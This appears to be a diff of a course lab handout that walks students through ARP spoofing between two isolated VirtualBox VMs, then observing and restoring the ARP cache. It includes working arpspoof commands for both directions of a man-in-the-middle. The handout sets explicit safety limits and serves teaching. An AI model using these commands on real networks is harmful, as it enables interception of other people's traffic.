@@ -1,75 +1,68 @@
+ARP Spoofing and Man-in-the-Middle (MITM) Demonstration
+
+
+Aim
+Understand how ARP spoofing can mislead devices on a local network, observe ARP changes, and explain mitigations.
+
+Software Required
+Two Linux VMs on a VirtualBox Host-only network (Kali attacker and your own victim VM); dsniff/arpspoof, tcpdump or Wireshark, curl, Python 3.
+
+Safety / Scope
+ARP spoofing is active network manipulation. Never use it on shared networks or devices you do not own. Do not attempt credential theft. If no isolated lab is available, complete the observation steps and explain the attack conceptually.
+
+Procedure / Commands
+
 A. Build the isolated network
-
 1. Power off VMs. In VirtualBox > VM Settings > Network, select Host-only Adapter for each lab VM and choose the same Host-only network.
-
 2. Do not use Bridged Adapter. Boot both VMs and run on each:
-
 $ ip -br addr
 $ ip route
-
 Record attacker IP, victim IP, interface name (for example eth0 or enp0s3), and gateway if present. Do not assume example IPs are yours.
 
 B. Install tools on Kali
-
 $ sudo apt update
 $ sudo apt install -y dsniff tcpdump wireshark
-
 If you do not have a GUI, tcpdump is sufficient for observing ARP.
-
 
 C. Record normal ARP mappings
 On Kali:
-
 $ ip neigh
 $ ip route
 On the victim, run ip neigh too. Write down the gateway/victim IP-to-MAC mapping before the demonstration.
 From Kali, replace VICTIM_IP with the victim's actual Host-only IP:
-
 $ curl http://VICTIM_IP:8080/
-
 Expected page text: Lab demo page - no secrets here.
 
-
 D. Observe ARP packets
-
 In another terminal, check:
-
 $ wireshark
-
 Record what ARP packets and neighbor entries look like before the test.
-
 
 F. Controlled ARP-spoofing demonstration
 Proceed only after the instructor confirms the Host-only lab and the IP addresses of your own VMs. Open two Kali terminals.
-
 Terminal 1: replace LAB_INTERFACE, VICTIM_IP and GATEWAY_IP with your lab values:
-
 $ sudo arpspoof -i LAB_INTERFACE -t VICTIM_IP GATEWAY_IP
-
 Terminal 2: run the reverse direction:
-
 $ sudo arpspoof -i LAB_INTERFACE -t GATEWAY_IP VICTIM_IP
 These commands send forged ARP replies. Keep them running only briefly and observe ARP packets using:
-
 $ wireshark
-
 On the victim, check the neighbor cache:
-
 $ ip neigh
-
 Compare the gateway's MAC mapping with your earlier notes. Do not capture passwords, cookies, tokens, or real user sessions.
 
-
 G. Stop and restore
-
 Press Ctrl+C in both arpspoof terminals first. Then, on both VMs, refresh neighbor entries:
-
 $ sudo ip neigh flush all
-
 Generate fresh traffic (replace GATEWAY_IP if you have a gateway):
-
 $ ping -c 2 GATEWAY_IP
-
 Check the table again:
-
 $ ip neigh
+
+Expected Output
+●	Before the test, ip neigh shows learned IP-to-MAC mappings.
+●	tcpdump/Wireshark shows ARP packets and replies during the test.
+●	The victim's gateway mapping may show a changed MAC while spoofing is running.
+●	After stopping the tools and refreshing neighbor entries, normal connectivity should return.
+
+Result
+ARP spoofing was demonstrated only in an isolated, authorized virtual network; observations and mitigations were recorded.
